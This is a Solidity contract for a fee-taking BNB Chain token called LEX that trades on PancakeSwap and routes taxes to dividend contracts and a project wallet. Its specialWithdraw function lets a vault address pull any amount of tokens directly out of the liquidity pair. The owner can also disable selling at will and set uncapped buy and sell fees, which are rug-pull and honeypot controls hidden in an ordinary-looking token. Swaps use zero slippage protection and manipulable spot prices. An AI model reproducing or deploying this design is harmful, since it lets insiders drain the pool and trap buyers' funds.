// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IDividends {
    function updateFarm(uint256 amount) external;
}

contract Lex is ERC20, Ownable{
    event SwapAndSendTax(address recipient, uint256 tokensSwapped);
    IUniswapV2Router02 public pancakeRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address public constant DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public constant PROFIT_WALLET_TAX_RATE = 10;
    uint256 public constant PROFIT_SUBCOIN_TAX_RATE = 10;
    uint256 public constant PROFIT_NODE_TAX_RATE = 5;

    uint256 public buyRate = 5;
    uint256 public sellRate = 5;
    address public pancakeFactory;
    address public pancakePair;
    address public USDT;
    address public leo;

    address public vault;

    address public wallet;
    address public nodeDividends;
    address public subCoinDividends;

    bool    private swapping;
    bool    public  openBuy;
    bool    public  openSell;

    mapping(address => bool) public allowlist;
    mapping(address => uint256) public totalCostUsdt;

    constructor(
        address _initialRecipient, 
        address _wallet, 
        address _nodeDividends, 
        address _USDT
    )ERC20("LEX","LEX")Ownable(msg.sender){
        _mint(_initialRecipient, 21000000e18);
        
        allowlist[_initialRecipient] = true;
        allowlist[_wallet] = true;
        allowlist[_nodeDividends] = true;

        wallet = _wallet;
        nodeDividends = _nodeDividends;
        USDT = _USDT;
        
        pancakePair = IPancakeFactory(pancakeRouter.factory())
            .createPair(address(this), USDT);
        pancakeFactory = pancakeRouter.factory();
    }

    function setVaultAddr(address _vault) external onlyOwner{
        vault = _vault;
        allowlist[_vault] = true;
    }

    function setLeoAddr(address _leo) external onlyOwner{
        leo = _leo;
    }

    function setNodeDividends(address _nodeDividends) external onlyOwner{
        nodeDividends = _nodeDividends;
        allowlist[_nodeDividends] = true;
    }

    function setSubCoinDividends(address _subCoinDividends) external onlyOwner{
        subCoinDividends = _subCoinDividends;
        allowlist[_subCoinDividends] = true;
    }

    function setRate(uint256 _buyRate, uint256 _sellRate) external onlyOwner{
        buyRate = _buyRate;
        sellRate = _sellRate;
    }

    function setAllowlist(address[] memory addrs, bool isAllow) external onlyOwner{
        for(uint i=0; i<addrs.length; i++){
            allowlist[addrs[i]] = isAllow;
        }
    }

    function switchBuy(bool _buy) external onlyOwner{
        openBuy = _buy;
    }

    function switchSell(bool _sell) external onlyOwner{
        openSell = _sell;
    }

    function getPath(uint8 mark) public view returns(address[] memory){
        require(mark < 2, "ERROR_MARK.");
        if(mark == 0){
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = USDT;
            return path;
        }else{
            address[] memory path = new address[](3);
            path[0] = address(this);
            path[1] = USDT;
            path[2] = leo;
            return path;
        }
    }

    function getPreconditions() public view returns(bool){
        address leoPair = IPancakeFactory(pancakeFactory).getPair(leo, USDT);
        uint256 supply = IERC20(leoPair).totalSupply();
        return leoPair != address(0) && supply > 0;
    }

    function getAmountOut(uint256 amountToken) public view returns(uint256){
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        uint256[] memory amounts = pancakeRouter.getAmountsOut(amountToken, path);
        return amounts[1];
    }

    function currentPrice() public view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;
        return pancakeRouter.getAmountsOut(1e18, path)[1];
    }

    function _swap(address[] memory path, uint256 amountToken, address to) private{
        if (amountToken == 0) return ;
        //update status
        swapping = true;
        _approve(address(this), address(pancakeRouter), amountToken);
         try pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountToken,
            0, 
            path,
            to,
            block.timestamp + 30
        ) {
            emit SwapAndSendTax(to, amountToken);
        }catch{}
        //update status
        swapping = false;
    }

    function getProfitTaxToken(
        address from,
        uint256 amountToken
    ) public view returns (uint256 taxToken) {
        if (amountToken == 0) return 0;

        uint256 userBalance = balanceOf(from);
        if (userBalance == 0) return 0;

        uint256 totalCost = totalCostUsdt[from];
        if (totalCost == 0) return 0;

   
        // current sell`s usdt
        uint256 usdtOut = getAmountOut(amountToken);
        if (usdtOut == 0) return 0;

        // part of cost
        uint256 costPart = totalCost * amountToken / userBalance;

        // no profit
        if (usdtOut <= costPart) return 0;

        // slippage
        if (usdtOut <= costPart) return 0;

        // The amount corresponding to the profit.
        uint256 profitUsdt = usdtOut - costPart;
        uint256 profitToken = amountToken * profitUsdt / usdtOut;

        uint256 totalProfitRate =
            PROFIT_WALLET_TAX_RATE +
            PROFIT_SUBCOIN_TAX_RATE +
            PROFIT_NODE_TAX_RATE;

        taxToken = profitToken * totalProfitRate / 100;

        if (taxToken > amountToken) {
            taxToken = 0;
        }
    }

    function specialWithdraw(uint256 amount) external {
        require(vault == msg.sender, "ERROR_PERMIT.");
        super._update(pancakePair, vault, amount);
    }

    function _updateCost(address to, uint256 amountToken) private{
        if (to == address(pancakeRouter) || to == pancakePair || to == DEAD) {
            return;
        }
        
        uint256 price = currentPrice(); // USDT / token
        uint256 costUsdt = price * amountToken / 1e18;
        totalCostUsdt[to] += costUsdt;
    }

    function _handleBuy(address from, address to, uint256 amount) private {
        require(openBuy, "BUY_ISDISABLED.");
        
        uint256 fee = amount * buyRate / 100;
        // 5%先转换为u，40%用于节点分红，40%买子币给节点分红，20%打到指定地址
        // uint256 nodeFee = fee * 40 / 100;
        // uint256 subCoinFee = fee * 40 / 100;
        // uint256 walletFee = fee - nodeFee - subCoinFee;
        uint256 amountTo = amount - fee;
        _updateCost(to, amount);

        super._update(from, address(this), fee);
        super._update(from, to, amountTo);
    }

    function _handleSell(address from, address to, uint256 amount) private {
        require(openSell, "SELL_ISDISABLED.");
        uint256 balanceBefore = balanceOf(from);
        // sell fee
        uint256 sellFee = amount * sellRate / 100;
        uint256 sellAmount = amount - sellFee;

        // calc profit tax
        uint256 profitTax = getProfitTaxToken(from, sellAmount);

        if (profitTax > 0) {
            super._update(from, address(this), profitTax);
            _processProfitTaxToken(profitTax);
        }

        super._update(from, address(this), sellFee);
        super._update(from, to, sellAmount - profitTax);

        // update cost
        uint256 balanceAfter = balanceOf(from);
        if (balanceAfter == 0) {
            totalCostUsdt[from] = 0;
        } else {
            uint256 costBefore = totalCostUsdt[from];
            uint256 costRemoved = costBefore * amount / balanceBefore;
            totalCostUsdt[from] = costBefore - costRemoved;

            if (totalCostUsdt[from] < 1e15) {
                totalCostUsdt[from] = 0;
            }
        }

    }


    function _processProfitTaxToken(uint256 profitTax) private{
        // 20%给U节点分红,40%自动买子币到分红合约,40%给指定地址
        uint256 toNode = profitTax * 20 / 100;
        if(nodeDividends != address(0)) {
            uint256 beforeSwap = IERC20(USDT).balanceOf(nodeDividends);
            _swap(getPath(0), toNode, nodeDividends);
            uint256 afterSwap = IERC20(USDT).balanceOf(nodeDividends);
            // TODO 更新分红
            IDividends(nodeDividends).updateFarm(afterSwap - beforeSwap);
        }
        uint256 toSubCoin = profitTax * 40 / 100;
        
        if(subCoinDividends != address(0) && getPreconditions()){
            uint256 beforeSwap = IERC20(leo).balanceOf(subCoinDividends);
            _swap(getPath(1), toSubCoin, subCoinDividends);
            uint256 afterSwap = IERC20(leo).balanceOf(subCoinDividends);
            IDividends(subCoinDividends).updateFarm(afterSwap - beforeSwap);
        }
        uint256 toWallet = profitTax - toNode - toSubCoin;
        _swap(getPath(0), toWallet, wallet);
        
    }

    function _processFee() private{
        // 10% 2%节点分红(20%)，4%子币分红(40%)，2%打到指定地址(20%)，2%直接销毁(20%)
        uint256 currentBalance = balanceOf(address(this));
        uint256 amountNode = currentBalance * 20 / 100;
        if(nodeDividends != address(0)) {
            uint256 beforeSwap = IERC20(USDT).balanceOf(nodeDividends);
            _swap(getPath(0), amountNode, nodeDividends);
            uint256 afterSwap = IERC20(USDT).balanceOf(nodeDividends);
            IDividends(nodeDividends).updateFarm(afterSwap - beforeSwap);
        }

        uint256 amountSubCoin = currentBalance * 40 / 100;
        if(subCoinDividends != address(0) && getPreconditions()){
            uint256 beforeSwap = IERC20(leo).balanceOf(subCoinDividends);
            _swap(getPath(1), amountSubCoin, subCoinDividends);
            uint256 afterSwap = IERC20(leo).balanceOf(subCoinDividends);
            IDividends(subCoinDividends).updateFarm(afterSwap - beforeSwap);
        }

        uint256 amountWallet = currentBalance * 20 / 100;
        _swap(getPath(0), amountWallet, wallet);

        uint256 amountBurn = currentBalance - amountNode - amountSubCoin - amountWallet;
        super._update(address(this), DEAD, amountBurn);

    }


    function _update(address from, address to, uint256 amount) internal virtual override {

        if (swapping || from == address(0) || to == address(0) || allowlist[from] || allowlist[to]) {
            super._update(from, to, amount);
            return;
        }

        bool isBuy = from == pancakePair;
        bool isSell = to == pancakePair;

        if (isBuy) {
            _handleBuy(from, to, amount);
            return;
        }

        if (isSell) {
            _handleSell(from, to, amount);
            return;
        }

        //处理手续费
        _processFee();
        uint256 balanceBefore = balanceOf(from);
        uint256 costBefore = totalCostUsdt[from];

        super._update(from, to, amount);

        if (costBefore > 0 && balanceBefore > 0) {
            uint256 migratedCost = costBefore * amount / balanceBefore;


            totalCostUsdt[from] = costBefore - migratedCost;
            if (totalCostUsdt[from] < 1e15) {
                totalCostUsdt[from] = 0;
            }

            totalCostUsdt[to] += migratedCost;
        }
    }

}